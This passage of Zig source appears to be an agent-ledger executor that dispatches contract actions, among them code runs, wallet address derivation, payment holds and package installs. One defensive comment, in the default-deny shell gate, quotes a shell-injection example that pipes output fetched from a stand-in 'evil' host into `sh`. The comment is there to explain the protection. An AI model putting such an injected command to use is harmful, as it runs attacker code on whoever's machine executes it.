        // threshold becomes UNREACHABLE — k-of-n fault tolerance means a single
        // dead child must not kill the whole (that is the point of a quorum),
        // but once too few children remain alive to ever reach `need`, the
        // quorum can never satisfy and must apoptose instead of HOLDING forever.
        // Before this, quorum never consulted isDead at all (fork F4/F5): a
        // dead/purged child was merely "not satisfied", so the quorum re-fired
        // every sweep forever. Emitting a `child_dead` result reuses the
        // existing apoptosis plumbing (bioClassifyRoadblock + resolveOne markDied).
        if (ids.len - dead < need) {
            evidencePrint("  result: FAIL — child_dead: quorum {d}/{d} unreachable ({d} dead)\n", .{ got, need, dead });
            return .{ .rc = 1, .result = "child_dead — quorum inherits death: too few live children to reach threshold" };
        }
        evidencePrint("  result: FAIL — quorum {d}/{d}\n", .{ got, need });
        return .{ .rc = 1, .result = "fail" };
    }

    if (std.mem.eql(u8, ptype, "contract-ref")) {
        const ref = action["contract:".len..];
        const target = if (ref.len >= 8) ref[0..8] else ref;
        // Hebbian counter: record this use; if target is a pattern row
        // and use-count crosses CONTRACT_PRIMITIVE_THRESHOLD (default 7,
        // Sabbath-shape: seven invocations to sanctify), promote it.
        const target_is_pattern = blk: {
            for (rows) |row| {
                if (std.mem.eql(u8, row.event, "pattern") and std.mem.eql(u8, row.id, target)) break :blk true;
            }
            break :blk false;
        };
        if (target_is_pattern) {
            contract.appendPatternUseRow(allocator, env, target, r.id) catch |use_err| {
                evidencePrint("hebbian: pattern_use append failed for {s}: {s} — counter unincremented\n", .{ target, @errorName(use_err) });
            };
            var use_count: u32 = 1; // counting this very use
            for (rows) |row| {
                if (std.mem.eql(u8, row.event, "pattern_use") and std.mem.eql(u8, row.id, target)) use_count += 1;
            }
            const threshold: u32 = 7;
            const already_primitive = blk2: {
                for (rows) |row| {
                    if (std.mem.eql(u8, row.event, "primitive") and std.mem.eql(u8, row.id, target)) break :blk2 true;
                }
                break :blk2 false;
            };
            if (use_count >= threshold and !already_primitive) {
                contract.appendPrimitiveRow(allocator, env, target, use_count) catch |caught_err| {
                    evidencePrint("hebbian: primitive append failed for {s}: {s} — promotion not durable\n", .{ target, @errorName(caught_err) });
                };
                evidencePrint("  hebbian-promotion: pattern:{s} use_count={d} >= threshold={d} -> baked as primitive\n", .{ target, use_count, threshold });
            }
        }
        // Phase 1: approved pointers surface values — but ONLY from a LIVE
        // (satisfied) producer. A dead or purged target has a nulling latest
        // terminal, so isSatisfied is false and its stale action_result must NOT
        // be adopted. Before the gate, contract:/value-of: surfaced bytes before
        // any terminal check (fork F5, value-surface death-blindness) — a dead
        // producer's value leaked out as PASS. Biology: adopt a value only from
        // a signal that holds NOW (matches fulfil:, which already gates first).
        if (isSatisfied(rows, target)) {
            if (!adoptionAllowed(allocator, rows, r.id, target)) {
                evidencePrint("  result: HOLD — contract:{s} receptor-restricted (no grant for {s})\n", .{ target, r.id });
                return .{ .rc = 1, .result = "hold:receptor" };
            }
            if (latestActionResult(rows, target)) |cached| {
                if (cached.len > 0) {
                    evidencePrint("  result: PASS — contract:{s} value surfaced ({d} bytes)\n", .{ target, cached.len });
                    return .{ .rc = 0, .result = try allocator.dupe(u8, cached) };
                }
            }
            evidencePrint("  result: PASS — contract:{s} satisfied (no value bytes)\n", .{target});
            return .{ .rc = 0, .result = "pass" };
        }
        evidencePrint("  result: FAIL — contract:{s} not satisfied\n", .{target});
        return .{ .rc = 1, .result = "fail" };
    }

    // Phase 2: fulfil:<id> — self-fulfilling return. The contract stays HOLD
    // until the target is terminal (satisfied) and then surfaces the target's
    // concrete result bytes as its own result. This is the "return a contract
    // and wait until equal" carrier. The caller (neuron/funnel) sees the value
    // in aggregation; equality checks live in the plan or a verify child.
    if (std.mem.eql(u8, ptype, "fulfil")) {
        const ref = action["fulfil:".len..];
        const target = if (ref.len >= 8) ref[0..8] else ref;
        if (!isSatisfied(rows, target)) {
            evidencePrint("  result: HOLD — fulfil waiting on contract:{s}\n", .{target});
            return .{ .rc = 1, .result = "hold:fulfil" };
        }
        if (!adoptionAllowed(allocator, rows, r.id, target)) {
            evidencePrint("  result: HOLD — fulfil:{s} receptor-restricted (no grant for {s})\n", .{ target, r.id });
            return .{ .rc = 1, .result = "hold:receptor" };
        }
        if (latestActionResult(rows, target)) |val| {
            if (val.len > 0) {
                evidencePrint("  result: PASS — fulfil:{s} value surfaced ({d} bytes)\n", .{ target, val.len });
                return .{ .rc = 0, .result = try allocator.dupe(u8, val) };
            }
        }
        if (isSatisfied(rows, target)) {
            evidencePrint("  result: PASS — fulfil:{s} satisfied (no bytes)\n", .{target});
            return .{ .rc = 0, .result = "pass" };
        }
        evidencePrint("  result: FAIL — fulfil:{s} not satisfied\n", .{target});
        return .{ .rc = 1, .result = "fail" };
    }

    // value-of:<id> — explicit value carrier alias for contract:<id>.
    // Semantically identical to contract-ref for surfacing.
    if (std.mem.eql(u8, ptype, "value-of")) {
        const ref = action["value-of:".len..];
        const target = if (ref.len >= 8) ref[0..8] else ref;
        // Same F5 death-gate as contract-ref: only surface a LIVE producer's
        // bytes; a dead/purged target must not leak its stale value.
        if (isSatisfied(rows, target)) {
            if (!adoptionAllowed(allocator, rows, r.id, target)) {
                evidencePrint("  result: HOLD — value-of:{s} receptor-restricted (no grant for {s})\n", .{ target, r.id });
                return .{ .rc = 1, .result = "hold:receptor" };
            }
            if (latestActionResult(rows, target)) |cached| {
                if (cached.len > 0) {
                    evidencePrint("  result: PASS — value-of:{s} surfaced ({d} bytes)\n", .{ target, cached.len });
                    return .{ .rc = 0, .result = try allocator.dupe(u8, cached) };
                }
            }
            evidencePrint("  result: PASS — value-of:{s} satisfied (no value bytes)\n", .{target});
            return .{ .rc = 0, .result = "pass" };
        }
        evidencePrint("  result: FAIL — value-of:{s} not satisfied\n", .{target});
        return .{ .rc = 1, .result = "fail" };
    }

    // kill-lineage:<root_id> — walk descendants of root_id, mark each as
    // apoptosed with reason "kill-lineage". The killing contract itself
    // satisfies on the count of killed descendants.
    if (std.mem.startsWith(u8, action, "kill-lineage:")) {
        const root = action["kill-lineage:".len..];
        var killed: u32 = 0;
        for (rows) |row| {
            if (!std.mem.eql(u8, row.event, "declared")) continue;
            if (row.parent_id == null) continue;
            // Walk up the parent chain; if root is an ancestor, kill this row.
            var cur: ?[]const u8 = row.parent_id;
            var depth: u8 = 0;
            while (cur != null and depth < 32) : (depth += 1) {
                if (std.mem.eql(u8, cur.?, root)) {
                    if (!isDead(rows, row.id) and !isSatisfied(rows, row.id)) {
                        contract.markDied(allocator, env, row.id, .apoptosed, null, "kill-lineage") catch continue;
                        killed += 1;
                    }
                    break;
                }
                cur = declaredParentOf(rows, cur.?);
            }
        }
        const msg = try std.fmt.allocPrint(allocator, "kill-lineage: {d} descendant(s) of {s} marked apoptosed", .{ killed, root });
        evidencePrint("  result: PASS — {s}\n", .{msg});
        return .{ .rc = 0, .result = msg };
    }

    // invite:<pubkey_hex>:<role,role,...> — external aiko by pubkey joins
    // the inviter's network with role grants. Inviter = this row's id.
    if (std.mem.startsWith(u8, action, "invite:")) {
        const rest = action["invite:".len..];
        const sep = std.mem.indexOfScalar(u8, rest, ':') orelse rest.len;
        const pubkey = rest[0..sep];
        const roles = if (sep < rest.len) rest[sep + 1 ..] else "read";
        try contract.appendInvitationRow(allocator, env, r.id, pubkey, roles);
        // Auto-emit one grant per role.
        var role_iter = std.mem.splitScalar(u8, roles, ',');
        var n: u32 = 0;
        while (role_iter.next()) |role| {
            if (role.len == 0) continue;
            try contract.appendGrantRow(allocator, env, r.id, pubkey, role, r.id);
            n += 1;
        }
        const msg = try std.fmt.allocPrint(allocator, "invite: pubkey={s} roles={s} grants_emitted={d}", .{ pubkey[0..@min(pubkey.len, 16)], roles, n });
        evidencePrint("  result: PASS — {s}\n", .{msg});
        return .{ .rc = 0, .result = msg };
    }

    // Code-typed action prefixes — first-class language bindings so the
    // contract row IS the strict-typed payload, not a free-form shell
    // string. Bun for TypeScript/JavaScript, python3 for Python, nanobrew
    // for package install (https://github.com/justrach/nanobrew). The
    // local binary trusts the named runtime is on PATH (baked at build
    // time per Dockerfile). Same capture + budget semantics as runShell.
    // Code prefixes write the body to a temp file (avoids shell-quote hell
    // with nested " ' \ in the source) and exec the runtime against it.
    if (std.mem.startsWith(u8, action, "bun:")) {
        const code = action["bun:".len..];
        const tmp = try std.fmt.allocPrint(allocator, "/tmp/aiko-bun-{d}.ts", .{time(null)});
        defer allocator.free(tmp);
        const tmp_z = try allocator.dupeZ(u8, tmp);
        defer allocator.free(tmp_z);
        var wflags: std.c.O = .{};
        wflags.ACCMODE = .WRONLY;
        wflags.CREAT = true;
        wflags.TRUNC = true;
        const fd = std.c.open(tmp_z.ptr, wflags, @as(c_uint, 0o600));
        if (fd < 0) return .{ .rc = 1, .result = "bun: temp open failed" };
        // `code` arrives JSON-decoded courtesy of parseRows → jsonStringDecoded.
        _ = std.c.write(fd, code.ptr, code.len);
        _ = std.c.close(fd);
        const cmd_text = try std.fmt.allocPrint(allocator, "bun run {s}", .{tmp});
        defer allocator.free(cmd_text);
        evidencePrint("  exec: bun {s} ({d} chars)\n", .{ tmp, code.len });
        const out_capture = try runShellCapture(allocator, cmd_text, r.cwd);
        if (out_capture.rc == 0) {
            evidence("  result: PASS (bun)\n");
            return .{ .rc = 0, .result = if (out_capture.output.len > 0) out_capture.output else "pass" };
        }
        evidencePrint("  result: FAIL (bun exit {d})\n", .{out_capture.rc});
        return .{ .rc = out_capture.rc, .result = if (out_capture.output.len > 0) out_capture.output else "fail" };
    }
    if (std.mem.startsWith(u8, action, "python:")) {
        const code = action["python:".len..];
        const tmp = try std.fmt.allocPrint(allocator, "/tmp/aiko-py-{d}.py", .{time(null)});
        defer allocator.free(tmp);
        const tmp_z = try allocator.dupeZ(u8, tmp);
        defer allocator.free(tmp_z);
        var wflags: std.c.O = .{};
        wflags.ACCMODE = .WRONLY;
        wflags.CREAT = true;
        wflags.TRUNC = true;
        const fd = std.c.open(tmp_z.ptr, wflags, @as(c_uint, 0o600));
        if (fd < 0) return .{ .rc = 1, .result = "python: temp open failed" };
        // `code` arrives JSON-decoded courtesy of parseRows → jsonStringDecoded.
        _ = std.c.write(fd, code.ptr, code.len);
        _ = std.c.close(fd);
        const cmd_text = try std.fmt.allocPrint(allocator, "python3 {s}", .{tmp});
        defer allocator.free(cmd_text);
        evidencePrint("  exec: python3 {s} ({d} chars)\n", .{ tmp, code.len });
        const out_capture = try runShellCapture(allocator, cmd_text, r.cwd);
        if (out_capture.rc == 0) {
            evidence("  result: PASS (python)\n");
            return .{ .rc = 0, .result = if (out_capture.output.len > 0) out_capture.output else "pass" };
        }
        evidencePrint("  result: FAIL (python exit {d})\n", .{out_capture.rc});
        return .{ .rc = out_capture.rc, .result = if (out_capture.output.len > 0) out_capture.output else "fail" };
    }
    // flex:budget:<lamports>:<mint> — declare an expected spend ceiling
    // for this contract's resolution. Fractal: every layer can carry its
    // own budget; the cloud compiler enforces that child budgets sum
    // <= parent's remaining authorization. Bare-bones implementation
    // emits a typed `budget_estimate` called row that the cloud reads.
    if (std.mem.startsWith(u8, action, "flex:budget:")) {
        const rest = action["flex:budget:".len..];
        const sep = std.mem.indexOfScalar(u8, rest, ':') orelse rest.len;
        const budget_lamports = rest[0..sep];
        const mint = if (sep < rest.len) rest[sep + 1 ..] else USDC_SOL_MINT;
        // Resolve antipattern:posthook-pointer-as-raw-url — declare the budget
        // claim as its own contract row first, then point the called row at
        // it via `contract:<id>`. The substrate refuses to write a called row
        // whose target_pointer carries payload (see appendCalledRow validator).
        const budget_claim = try std.fmt.allocPrint(allocator, "flex:budget lamports={s} mint={s}", .{ budget_lamports, mint });
        defer allocator.free(budget_claim);
        const budget_id_opt: ?[]u8 = contract.declare(allocator, env, budget_claim, "", .{}) catch |decl_err| blk: {
            evidencePrint("  flex:budget declare failed: {s} — skipping called row\n", .{@errorName(decl_err)});
            break :blk null;
        };
        if (budget_id_opt) |bid| {
            defer allocator.free(bid);
            const target = try std.fmt.allocPrint(allocator, "contract:{s}", .{bid});
            defer allocator.free(target);
            contract.appendCalledRow(allocator, env, r.id, target, "budget-estimate") catch |caught_err| {
                evidencePrint("flex:budget: appendCalledRow failed: {s} — no observable edge from {s}\n", .{ @errorName(caught_err), r.id });
            };
        }
        const msg = try std.fmt.allocPrint(allocator, "budget: max={s} lamports of {s}", .{ budget_lamports, mint });
        evidencePrint("  result: PASS — {s}\n", .{msg});
        return .{ .rc = 0, .result = msg };
    }

    // flex:hold:<max_lamports>[:mint] — declare a Faremeter Flex hold
    // request. Auto-includes the FOUNDRY_CUT_BPS=5000 (50%) split to
    // FOUNDRY_CUT_ADDRESS first; client destination fills remaining
    // 5000 bps. Authorization_id is generated from time(null) + cid.
    if (std.mem.startsWith(u8, action, "flex:hold:")) {
        const rest = action["flex:hold:".len..];
        const sep = std.mem.indexOfScalar(u8, rest, ':') orelse rest.len;
        const max_str = rest[0..sep];
        const mint = if (sep < rest.len) rest[sep + 1 ..] else USDC_SOL_MINT;
        const max_amount = std.fmt.parseInt(u64, max_str, 10) catch {
            evidence("  result: FAIL — flex:hold parse\n");
            return .{ .rc = 1, .result = "flex-hold-parse-fail" };
        };
        // Derive client destination from current identity's Solana addr.
        const root = lineage_lib.loadOrInitRootKey(allocator, env) catch return .{ .rc = 1, .result = "no-root-key" };
        const identity = r.id;
        const kp = lineage_lib.deriveKeyPair(root, identity) catch return .{ .rc = 1, .result = "derive-failed" };
        var client_b58: [64]u8 = undefined;
        const client_n = b58encode(&kp.public_key.bytes, &client_b58);
        // authorization_id = <unix_secs>-<cid_first_8>
        const auth_id = try std.fmt.allocPrint(allocator, "{d}-{s}", .{ time(null), r.id });
        defer allocator.free(auth_id);
        // splits: 5000 bps to Foundry, 5000 bps to client destination
        const splits_json = try std.fmt.allocPrint(
            allocator,
            "[{{\"recipient\":\"{s}\",\"bps\":{d}}},{{\"recipient\":\"{s}\",\"bps\":{d}}}]",
            .{ FOUNDRY_CUT_ADDRESS, FOUNDRY_CUT_BPS, client_b58[0..client_n], 10000 - FOUNDRY_CUT_BPS },
        );
        defer allocator.free(splits_json);
        const expires: u64 = 0; // facilitator clamps to <= refund_timeout_slots
        contract.appendFlexHoldRow(allocator, env, r.id, max_amount, mint, auth_id, expires, splits_json) catch return .{ .rc = 1, .result = "flex-hold-append-fail" };
        const msg = try std.fmt.allocPrint(allocator, "flex_hold: max={d} mint={s} auth_id={s} cut=50%->{s}", .{ max_amount, mint, auth_id, FOUNDRY_CUT_ADDRESS });
        evidencePrint("  result: PASS — {s}\n", .{msg});
        return .{ .rc = 0, .result = msg };
    }

    // flex:settle:<authorization_id>:<actual_lamports> — convert hold
    // to pending on-chain settlement at actual consumption.
    if (std.mem.startsWith(u8, action, "flex:settle:")) {
        const rest = action["flex:settle:".len..];
        const sep = std.mem.indexOfScalar(u8, rest, ':') orelse return .{ .rc = 1, .result = "flex-settle-parse-fail" };
        const auth_id = rest[0..sep];
        const amt_str = rest[sep + 1 ..];
        const settle_amount = std.fmt.parseInt(u64, amt_str, 10) catch return .{ .rc = 1, .result = "flex-settle-parse-fail" };
        contract.appendFlexSettleRow(allocator, env, r.id, auth_id, settle_amount) catch return .{ .rc = 1, .result = "flex-settle-append-fail" };
        const msg = try std.fmt.allocPrint(allocator, "flex_settle: auth_id={s} actual={d}", .{ auth_id, settle_amount });
        evidencePrint("  result: PASS — {s}\n", .{msg});
        return .{ .rc = 0, .result = msg };
    }

    // wallet:address — emit CAIP-10 addresses for every chain the
    // substrate derives. Same root_seed → ed25519 (Solana family) +
    // secp256k1 (EVM family). The 402 envelope's `network` field picks
    // which key signs — caller never specifies.
    if (std.mem.eql(u8, action, "wallet:address")) {
        const root = lineage_lib.loadOrInitRootKey(allocator, env) catch {
            evidence("  result: FAIL — no root key\n");
            return .{ .rc = 1, .result = "no-root-key" };
        };
        const identity_id = r.id;
        // Solana (ed25519)
        const sol_kp = lineage_lib.deriveKeyPair(root, identity_id) catch return .{ .rc = 1, .result = "derive-failed" };
        var b58: [64]u8 = undefined;
        const b58_n = b58encode(&sol_kp.public_key.bytes, &b58);
        // EVM (secp256k1) — same address across all EVM chains
        var evm_priv: [32]u8 = undefined;
        deriveEvmPrivateKey(root, identity_id, &evm_priv) catch return .{ .rc = 1, .result = "evm-derive-failed" };
        var evm_addr: [42]u8 = undefined;
        _ = evmAddressFromPriv(evm_priv, &evm_addr) catch return .{ .rc = 1, .result = "evm-address-failed" };
        const msg = try std.fmt.allocPrint(allocator,
            \\identity={s}
            \\solana:mainnet:{s}
            \\eip155:1:{s}     (Ethereum mainnet)
            \\eip155:8453:{s}  (Base)
            \\eip155:42161:{s} (Arbitrum One)
            \\eip155:137:{s}   (Polygon)
        , .{ identity_id, b58[0..b58_n], &evm_addr, &evm_addr, &evm_addr, &evm_addr });
        evidencePrint("  result: PASS — chain-agnostic addresses derived\n", .{});
        return .{ .rc = 0, .result = msg };
    }

    // wallet:setup — chain-agnostic first-run guidance.
    if (std.mem.eql(u8, action, "wallet:setup")) {
        const root = lineage_lib.loadOrInitRootKey(allocator, env) catch return .{ .rc = 1, .result = "no-root-key" };
        const identity_id = r.id;
        const sol_kp = lineage_lib.deriveKeyPair(root, identity_id) catch return .{ .rc = 1, .result = "derive-failed" };
        var b58: [64]u8 = undefined;
        const b58_n = b58encode(&sol_kp.public_key.bytes, &b58);
        const sol_addr = b58[0..b58_n];
        var evm_priv: [32]u8 = undefined;
        deriveEvmPrivateKey(root, identity_id, &evm_priv) catch return .{ .rc = 1, .result = "evm-derive-failed" };
        var evm_addr: [42]u8 = undefined;
        _ = evmAddressFromPriv(evm_priv, &evm_addr) catch return .{ .rc = 1, .result = "evm-address-failed" };
        const guide = try std.fmt.allocPrint(allocator,
            \\WALLET SETUP — your aiko identity is chain-agnostic.
            \\Same root_seed -> ed25519 (Solana family) + secp256k1 (EVM family).
            \\The 402 envelope's `network` field picks which key signs.
            \\
            \\  Identity        : {s}
            \\  CAIP-10 addresses:
            \\    solana:mainnet : {s}
            \\    eip155:1       : {s}  (Ethereum mainnet)
            \\    eip155:8453    : {s}  (Base — recommended, low fees)
            \\    eip155:42161   : {s}  (Arbitrum One)
            \\    eip155:137     : {s}  (Polygon)
            \\
            \\  TOP UP — any USDC on ANY of those chains works. Recommended: Base.
            \\    Base USDC:  send to {s}  (~$0.001 per x402 call)
            \\    Solana USDC: send to {s}  (~$0.001 per x402 call)
            \\
            \\  Inspect:
            \\    Solana:    https://solscan.io/account/{s}
            \\    EVM (Base): https://basescan.org/address/{s}
            \\
            \\  Recovery: back up ~/.contracts/root.key (canon 651be176).
        , .{ identity_id, sol_addr, &evm_addr, &evm_addr, &evm_addr, &evm_addr, &evm_addr, sol_addr, sol_addr, &evm_addr });
        defer allocator.free(guide);
        out(guide);
        out("\n");
        // Resolve antipattern:NotASynapsePointer — declare the
        // wallet-setup-complete payload as its own contract row first, then
        // point the called row at it via `contract:<id>` (canonical pattern,
        // see flex:budget refactor above).
        const wallet_claim = "wallet:setup-complete kind=multichain ed25519+secp256k1";
        const wallet_id_opt: ?[]u8 = contract.declare(allocator, env, wallet_claim, "", .{}) catch |decl_err| blk: {
            evidencePrint("wallet-setup: declare-complete failed: {s} — skipping called row\n", .{@errorName(decl_err)});
            break :blk null;
        };
        if (wallet_id_opt) |wid| {
            defer allocator.free(wid);
            const target = try std.fmt.allocPrint(allocator, "contract:{s}", .{wid});
            defer allocator.free(target);
            contract.appendCalledRow(allocator, env, r.id, target, "wallet-setup") catch |caught_err| {
                evidencePrint("wallet-setup: appendCalledRow failed: {s} — no observable edge from {s}\n", .{ @errorName(caught_err), r.id });
            };
        }
        return .{ .rc = 0, .result = "wallet-setup-done-multichain" };
    }

    // route:<env_kind> — ROUTER action. The contract declares which
    // adapter family it wants to run in (turbobox, runpod, telegram-bot,
    // local-mac, vm, mesh-peer, ...). Local executor emits a
    // `route_request` called row with the chosen kind + caller env
    // fingerprint; cloud compiler picks the matching adapter contract.
    // Resolves PASS immediately — the routing decision IS the work; the
    // actual binding happens server-side via the adapter neuron.
    if (std.mem.startsWith(u8, action, "route:")) {
        const env_kind = action["route:".len..];
        // Resolve antipattern:NotASynapsePointer — declare the route-request
        // payload as its own contract row, then pass `contract:<id>` as the
        // target_pointer (canonical pattern; mirrors flex:budget above).
        const route_claim = try std.fmt.allocPrint(allocator, "route:env_kind={s}", .{env_kind});
        defer allocator.free(route_claim);
        const route_id_opt: ?[]u8 = contract.declare(allocator, env, route_claim, "", .{}) catch |decl_err| blk: {
            evidencePrint("route: declare failed: {s} — skipping called row\n", .{@errorName(decl_err)});
            break :blk null;
        };
        if (route_id_opt) |rid| {
            defer allocator.free(rid);
            const target = try std.fmt.allocPrint(allocator, "contract:{s}", .{rid});
            defer allocator.free(target);
            contract.appendCalledRow(allocator, env, r.id, target, "route-request") catch |caught_err| {
                evidencePrint("route: appendCalledRow failed: {s} — no observable edge from {s}\n", .{ @errorName(caught_err), r.id });
            };
        }
        evidencePrint("  route: requested env_kind={s}\n", .{env_kind});
        const msg = try std.fmt.allocPrint(allocator, "route-request: env_kind={s}", .{env_kind});
        return .{ .rc = 0, .result = msg };
    }

    // depends_on:<runtime>:<pkg> — declarative sidecar. Resolves by
    // running `nanobrew install <pkg>` (or runtime-specific equivalent)
    // if the package isn't already on PATH. Idempotent — re-firing on a
    // satisfied dependency is a no-op via the standard cache-validity
    // check (input_hash invalidates on policy change).
    if (std.mem.startsWith(u8, action, "depends_on:")) {
        const rest = action["depends_on:".len..];
        const sep = std.mem.indexOfScalar(u8, rest, ':') orelse return .{ .rc = 1, .result = "depends_on: missing pkg" };
        const runtime = rest[0..sep];
        const pkg = rest[sep + 1 ..];
        // Probe first: if pkg is already on PATH, no-op.
        const probe_buf = try std.fmt.allocPrint(allocator, "command -v {s} >/dev/null 2>&1", .{pkg});
        defer allocator.free(probe_buf);
        const probe_z = try allocator.dupeZ(u8, probe_buf);
        defer allocator.free(probe_z);
        if (system(probe_z.ptr) == 0) {
            evidencePrint("  result: PASS — depends_on:{s}:{s} already present\n", .{ runtime, pkg });
            return .{ .rc = 0, .result = "present" };
        }
        // Install via nanobrew. Other runtimes (pip, bun add) extend later.
        const install_cmd = try std.fmt.allocPrint(allocator, "nanobrew install \"{s}\"", .{pkg});
        defer allocator.free(install_cmd);
        evidencePrint("  exec: depends_on {s}:{s} via nanobrew\n", .{ runtime, pkg });
        const out_capture = try runShellCapture(allocator, install_cmd, r.cwd);
        if (out_capture.rc == 0) {
            evidence("  result: PASS (sidecar installed)\n");
            return .{ .rc = 0, .result = if (out_capture.output.len > 0) out_capture.output else "installed" };
        }
        evidencePrint("  result: FAIL (sidecar install exit {d})\n", .{out_capture.rc});
        return .{ .rc = out_capture.rc, .result = if (out_capture.output.len > 0) out_capture.output else "fail" };
    }

    if (std.mem.startsWith(u8, action, "nanobrew:")) {
        const pkg = action["nanobrew:".len..];
        const cmd_text = try std.fmt.allocPrint(allocator, "nanobrew install \"{s}\"", .{pkg});
        defer allocator.free(cmd_text);
        evidencePrint("  exec: nanobrew install {s}\n", .{pkg});
        const out_capture = try runShellCapture(allocator, cmd_text, r.cwd);
        if (out_capture.rc == 0) {
            evidence("  result: PASS (nanobrew)\n");
            return .{ .rc = 0, .result = if (out_capture.output.len > 0) out_capture.output else "pass" };
        }
        evidencePrint("  result: FAIL (nanobrew exit {d})\n", .{out_capture.rc});
        return .{ .rc = out_capture.rc, .result = if (out_capture.output.len > 0) out_capture.output else "fail" };
    }

    // grant:<pubkey_hex>:<role>:<scope_id> — delegate one (actor, role,
    // scope) tuple. Granter = this row's id; chained grants follow lineage.
    if (std.mem.startsWith(u8, action, "grant:")) {
        const rest = action["grant:".len..];
        const s1 = std.mem.indexOfScalar(u8, rest, ':') orelse return .{ .rc = 1, .result = "grant: missing role" };
        const s2 = std.mem.indexOfScalarPos(u8, rest, s1 + 1, ':') orelse rest.len;
        const pubkey = rest[0..s1];
        const role = rest[s1 + 1 .. s2];
        const scope = if (s2 < rest.len) rest[s2 + 1 ..] else r.id;
        try contract.appendGrantRow(allocator, env, r.id, pubkey, role, scope);
        const msg = try std.fmt.allocPrint(allocator, "grant: pubkey={s} role={s} scope={s}", .{ pubkey[0..@min(pubkey.len, 16)], role, scope });
        evidencePrint("  result: PASS — {s}\n", .{msg});
        return .{ .rc = 0, .result = msg };
    }

    var body = action;
    if (std.mem.startsWith(u8, action, "loop-until:")) body = action["loop-until:".len..];
    if (std.mem.startsWith(u8, action, "harness:")) {
        const hdir = action["harness:".len..];
        body = try std.fmt.allocPrint(allocator, "\"{s}/verify.sh\"", .{hdir});
    }
    // Capture stdout+stderr so the parent layer sees child context, not
    // just an exit code. This is the recursive context-aggregation channel.
    // EXEC-BINARY routing — if the row's environment names another aiko
    // binary (already-materialized on this host or a mesh peer), fork it
    // as a subprocess passing the plan as the goal. The shape carries
    // forward: spawned aiko writes to its own ledger scope and returns
    // typed result via stdout. This is how the lineage-mesh reaches into
    // another machine without re-installing — the binary already exists
    // there from a previous materialize, we just exec it.
    // exec-binary env routing (CONTRACT_EXEC_BINARY / CONTRACT_EXEC_MODE) removed.
    // Drill A — shell strict gate: refuse meta-shell when CONTRACT_SHELL_STRICT=1.
    // Policy comes from the action's environment; rejection is HOLD with a
    // named cause, never silent execution.
    if (shellStrictReject(body, env)) |cause| {
        evidencePrint("  result: HOLD — {s}\n", .{cause});
        return .{ .rc = 1, .result = try allocator.dupe(u8, cause) };
    }
    // Fork F8 default-deny: only genuine executable ptypes may shell-execute —
    // cli/api shell commands, a loop-until: body, or a harness: verify.sh. Any
    // OTHER ptype reaching this fall-through is a typed doctrine pointer the
    // validator blessed (isKnownAction) but no executor branch handled; running
    // it as `sh -c "<action>"` is a shell-injection surface (e.g. an action of
    // `word:; curl evil | sh` passes validation, then breaks out here). HOLD it
    // instead — an immune system does not execute an unrecognized protein. This
    // is the executor half of collapsing the F8 classifier fork; the classifier
    // (zig/src/pointer.zig) now recognizes the same typed prefixes the validator
    // does, so every non-cli/api/loop/harness kind lands here and is refused.
    if (!std.mem.eql(u8, ptype, "cli") and !std.mem.eql(u8, ptype, "api") and
        !std.mem.eql(u8, ptype, "loop") and !std.mem.eql(u8, ptype, "harness"))
    {
        evidencePrint("  result: HOLD — {s} is a typed pointer ({s}) with no executor; not shell-executed (fork F8)\n", .{ action, ptype });
        return .{ .rc = 1, .result = "hold:inert-pointer" };
    }
    const out_capture = try runShellCapture(allocator, body, r.cwd);
    if (out_capture.rc == 0) {
        evidence("  result: PASS (exit 0)\n");
        if (out_capture.output.len > 0) return .{ .rc = 0, .result = out_capture.output };
        return .{ .rc = 0, .result = "pass" };
    }
    evidencePrint("  result: FAIL (exit {d})\n", .{out_capture.rc});
    if (out_capture.output.len > 0) return .{ .rc = out_capture.rc, .result = out_capture.output };
    return .{ .rc = out_capture.rc, .result = "fail" };
}

const DeclareArgs = struct { plan: []const u8, action: ?[]const u8 = null, parent: ?[]const u8 = null, fast: bool = false, register: bool = false, resolve: bool = false };

fn parseDeclare(args: []const []const u8) !DeclareArgs {
    if (args.len == 0) return error.MissingPlan;
    // Simple positional: plan only (legacy) or plan + --action X [--parent Y] [--fast]
    if (args.len == 1) return .{ .plan = args[0] };
    var plan: ?[]const u8 = null;
    var action: ?[]const u8 = null;
    var parent: ?[]const u8 = null;
    var fast: bool = false;
    var register: bool = false;
    var resolve: bool = false;
    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        const a = args[i];
        if (std.mem.eql(u8, a, "--action") and i + 1 < args.len) {
            action = args[i + 1];
            i += 1;
            continue;
        }
        if (std.mem.eql(u8, a, "--parent") and i + 1 < args.len) {
            parent = args[i + 1];
            i += 1;
            continue;
        }
        if (std.mem.eql(u8, a, "--fast")) {
            fast = true;
            continue;
        }
        // --register: pure register — append the declared row, print the id, and
        // return. This is now the DEFAULT (SKILL.md: bookkeeping must never block
        // or slow the real work); the flag is kept as an accepted no-op for
        // existing callers (e.g. aiko-cli's anchor).
        if (std.mem.eql(u8, a, "--register")) {
            register = true;
            continue;
        }
        // --resolve: opt into the full lifecycle — word fanout + resolveLineage.
        // Resolution is a deliberate act, not a side effect of speaking; the
        // ledger-wide sweep lives solely in the drill: action.
        if (std.mem.eql(u8, a, "--resolve")) {
            resolve = true;
            continue;
        }
        if (plan == null) {
            plan = a;
            continue;
        }
    }
    if (plan == null) return error.MissingPlan;
    return .{ .plan = plan.?, .action = action, .parent = parent, .fast = fast, .register = register, .resolve = resolve };
}

/// Visibility axis (not transport).
///
/// `shared` (default) — the row joins the substrate's shared graph: cloud
/// ledger, federation peers, collaborator-visible. The actual TRANSPORT
/// today is Unbrowse-HTTP-then-local-on-402, but that is the substrate's
/// concern; the caller chooses VISIBILITY, not network topology.
///
/// `private_only` — never leaves this machine. The substrate skips the
/// cloud-declare attempt entirely and runs the one-shot lifecycle against
/// the on-disk ledger only. Used for goals containing PII, secrets, or
/// anything the operator explicitly does not want federated.
const AikoMode = enum {
    shared,
    private_only,
};

const AikoArgs = struct {
    plan: []u8,
    mode: AikoMode,
};

fn parseAikoArgs(allocator: std.mem.Allocator, args: []const []const u8) !AikoArgs {
    if (args.len == 0) return error.MissingPlan;
    var mode: ?AikoMode = null;
    var parts: std.ArrayList([]const u8) = .empty;
    defer parts.deinit(allocator);
    var i: usize = 0;
    while (i < args.len) : (i += 1) {
        const arg = args[i];
        // The only flag is --private. Absence = shared (the default).
        if (std.mem.eql(u8, arg, "--private")) {
            if (mode != null) return error.DuplicateMode;
            mode = .private_only;
        } else if (std.mem.startsWith(u8, arg, "--")) {
            return error.UnknownFlag;
        } else {
            try parts.append(allocator, arg);
        }
    }
    if (parts.items.len == 0) return error.MissingPlan;
